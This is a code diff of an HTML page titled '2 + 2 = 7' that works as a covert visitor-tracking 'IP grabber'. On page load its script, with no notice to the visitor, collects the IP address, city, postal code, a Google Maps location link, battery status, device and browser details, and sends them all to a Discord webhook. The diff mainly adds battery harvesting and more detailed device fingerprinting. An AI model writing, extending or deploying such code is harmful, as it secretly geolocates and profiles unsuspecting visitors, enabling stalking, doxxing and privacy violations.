@@ -1,6 +1,12 @@
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>2 + 2 = 7</title>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>2 + 2 = 7</title>
+</head>
+<body>
+
 <script>
   async function sendWebhook(data) {
     const webhookURL = 'YOUR DISCORD WEBHOOK HERE';
@@ -8,7 +14,7 @@
       embeds: [
         {
           title: 'Someone visited the website ! :information_source:',
-          color: 0x3498db,
+          color: 0x000000, // Black color
           fields: data,
           timestamp: new Date().toISOString()
         }
@@ -36,61 +42,114 @@
     const collectedData = [];
 
     const userAgent = navigator.userAgent;
-    collectedData.push({ name: 'User Agent', value: userAgent });
+    collectedData.push({ name: '» User Agent', value: userAgent });
 
     const language = navigator.language;
-    collectedData.push({ name: 'Browser language', value: language });
+    collectedData.push({ name: '» Browser language', value: language });
 
     const screenResolution = `${window.screen.width}x${window.screen.height}`;
-    collectedData.push({ name: 'Screen resolution', value: screenResolution });
+    collectedData.push({ name: '» Screen resolution', value: screenResolution });
 
-    const deviceType = getDeviceType();
-    collectedData.push({ name: 'Device type', value: deviceType });
+    const deviceInfo = getDeviceInfo();
+    collectedData.push({ name: '» Device Info', value: deviceInfo });
 
     const browser = getBrowserInfo();
-    collectedData.push({ name: 'Browser', value: browser });
+    collectedData.push({ name: '» Browser', value: browser });
 
     const operatingSystem = getOperatingSystem();
-    collectedData.push({ name: 'Operating system', value: operatingSystem });
+    collectedData.push({ name: '» Operating system', value: operatingSystem });
 
-    const referrer = document.referrer || 'Aucun référent';
-    collectedData.push({ name: 'Referent', value: referrer });
+    const referrer = document.referrer || 'no referent';
+    collectedData.push({ name: '» Referent', value: referrer });
 
     try {
       const geoLocationAPI = 'https://ipapi.co/json';
       const ipInfoResponse = await fetch(geoLocationAPI);
       const ipInfoData = await ipInfoResponse.json();
       if (ipInfoResponse.ok) {
-        collectedData.push({ name: 'IP address', value: ipInfoData.ip });
-        collectedData.push({ name: 'Country', value: ipInfoData.country_name });
-        collectedData.push({ name: 'Area', value: ipInfoData.region });
-        collectedData.push({ name: 'City', value: ipInfoData.city });
-        collectedData.push({ name: 'Zip code', value: ipInfoData.postal });
+        collectedData.push({ name: '» IP address', value: ipInfoData.ip });
+        collectedData.push({ name: '» Country', value: ipInfoData.country_name });
+        collectedData.push({ name: '» Area', value: ipInfoData.region });
+        collectedData.push({ name: '» City', value: ipInfoData.city });
+        collectedData.push({ name: '» Zip code', value: ipInfoData.postal });
         const googleMapsLink = `[View on Google Maps](${getGoogleMapsLink(ipInfoData.latitude, ipInfoData.longitude)})`;
-        collectedData.push({ name: 'Google Maps location', value: googleMapsLink });
+        collectedData.push({ name: '» Google Maps location', value: googleMapsLink });
       }
     } catch (error) {
       console.error('error 2 :', error);
     }
 
-    collectedData.push({ name: 'Network connection type', value: getNetworkConnectionType() });
-    collectedData.push({ name: 'Device language', value: getDeviceLanguage() });
-    collectedData.push({ name: 'Browser features', value: getBrowserCapabilities() });
-    collectedData.push({ name: 'Bandwidth estimation', value: await getEstimatedBandwidth() });
-    collectedData.push({ name: 'Device platform', value: getDevicePlatform() });
-    collectedData.push({ name: 'Browser memory', value: getBrowserMemory() });
+    collectedData.push({ name: '» Network connection type', value: getNetworkConnectionType() });
+    collectedData.push({ name: '» Device language', value: getDeviceLanguage() });
+    collectedData.push({ name: '» Browser features', value: getBrowserCapabilities() });
+    collectedData.push({ name: '» Bandwidth estimation', value: await getEstimatedBandwidth() });
+    collectedData.push({ name: '» Device platform', value: getDevicePlatform() });
+    collectedData.push({ name: '» Browser memory', value: getBrowserMemory() });
+
+    // Battery information
+    try {
+      const batteryInfo = await getBatteryInfo();
+      collectedData.push({ name: '» Battery Level', value: `${batteryInfo.level * 100}%` });
+      collectedData.push({ name: '» Battery Charging', value: batteryInfo.charging ? 'Yes' : 'No' });
+      collectedData.push({ name: '» Battery Charging Time', value: `${batteryInfo.chargingTime.toFixed(2)} seconds` });
+      collectedData.push({ name: '» Battery Discharging Time', value: `${batteryInfo.dischargingTime.toFixed(2)} seconds` });
+      collectedData.push({ name: '» Battery Charge Type', value: batteryInfo.chargeType });
+    } catch (error) {
+      console.error('error getting battery information:', error);
+    }
 
     sendWebhook(collectedData);
   }
 
-  function getDeviceType() {
-    const screenWidth = window.innerWidth;
-    if (screenWidth > 1200) {
+  function getDeviceInfo() {
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const isTablet = /(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(navigator.userAgent);
+    const isDesktop = !isMobile && !isTablet;
+
+    if (isDesktop) {
       return 'Desktop';
-    } else if (screenWidth > 768) {
-      return 'Tablette';
+    } else if (isTablet) {
+      return 'Tablet';
     } else {
-      return 'Mobile';
+      // Get more detailed device information for mobile
+      const mobileDevice = getMobileDevice();
+      return `Mobile (${mobileDevice})`;
+    }
+  }
+
+  function getMobileDevice() {
+    const ua = navigator.userAgent;
+    const mobileDevice = ua.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/);
+    return mobileDevice ? mobileDevice[0] : 'Unknown Mobile Device';
+  }
+
+  function getBatteryInfo() {
+    return new Promise(async (resolve, reject) => {
+      try {
+        const battery = await navigator.getBattery();
+        resolve({
+          level: battery.level,
+          charging: battery.charging,
+          chargingTime: battery.chargingTime,
+          dischargingTime: battery.dischargingTime,
+          chargeType: getBatteryChargeType(battery.charging)
+        });
+      } catch (error) {
+        reject(error);
+      }
+    });
+  }
+
+  function getBatteryChargeType(isCharging) {
+    if (!isCharging) {
+      return 'Not Applicable';
+    }
+
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (connection && connection.type) {
+      return connection.type;
+    } else {
+      return 'Unknown';
     }
   }
 
@@ -102,7 +161,7 @@
 
   function getOperatingSystem() {
     const ua = navigator.userAgent;
-    let os = 'Inconnu';
+    let os = 'Unknown';
     if (ua.indexOf('Win') !== -1) os = 'Windows';
     else if (ua.indexOf('Mac') !== -1) os = 'MacOS';
     else if (ua.indexOf('Linux') !== -1) os = 'Linux';
@@ -122,9 +181,9 @@
 
   function getBrowserCapabilities() {
     const capabilities = [];
-    capabilities.push(`Cookies: ${navigator.cookieEnabled}`);
-    capabilities.push(`JavaScript: ${navigator.javaEnabled()}`);
-    return capabilities.join(', ');
+    capabilities.push(`» Cookies: ${navigator.cookieEnabled}`);
+    capabilities.push(`» JavaScript: ${navigator.javaEnabled()}`);
+    return capabilities.join('\n');
   }
 
   async function getEstimatedBandwidth() {
@@ -147,6 +206,5 @@
   collectInformation();
 </script>
 
-
-  <p>help: </p>
-  <a href="https://discord.gg/y4XEttCZb7">discord server</a>
+</body>
+</html>
